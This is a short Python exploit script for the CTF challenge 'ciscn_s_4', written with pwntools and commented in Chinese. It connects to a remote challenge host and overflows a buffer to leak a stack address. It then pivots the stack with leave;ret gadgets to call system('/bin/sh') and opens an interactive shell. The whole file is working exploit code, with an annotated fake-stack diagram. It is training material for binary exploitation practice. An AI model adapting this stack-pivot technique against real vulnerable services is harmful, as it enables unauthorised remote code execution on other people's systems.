from pwn import *

r = remote('node5.buuoj.cn', 29418)
# r = process(r'./ciscn_s_4')
elf = ELF(r'./ciscn_s_4')

context.log_level = 'debug'

# system_addr = elf.sym['system']
system_addr = 0x8048400
leave_ret = 0x08048562

payload = b'A' * 0x26 + b'B' * 0x2
r.sendafter(b'name?', payload)
r.recvuntil(b'AABB')
ebp_addr = u32(r.recv(4)) - 0x10
buf_addr = ebp_addr - 0x28

print(f"buf_addr: {buf_addr}")

# gdb.attach(r)

# fake stack, 迁移到预先布置好的栈上
#           占用ebp     system         返回函数         写入/bin/sh的地址        写入sh
payload2 = b'B' * 4 + p32(system_addr) + p32(0) + p32(buf_addr + 0x4 * 4) + b'/bin/sh\x00'
#             填充至ebp前                    ebp要去的地方     执行第二次leave_ret,控制esp到buf_addr（第一次leave是程序本身）
payload2 = payload2.ljust(0x28, b'\x00') + p32(buf_addr) + p32(leave_ret)
# 大致伪造栈如下：
'''
buf.addr          | bbbb  
buf.addr + 4      | system  
buf.addr + 8      | p32(0)  
                  | buf.addr + 4*4  
                  | /bin/sh\x00  
                  | 0  
                  | 0  
                  | 0  
buf.addr + 0x28   | 0  
ebp               | buf.addr  
                  | leave ret  
'''
r.send(payload2)
r.interactive()
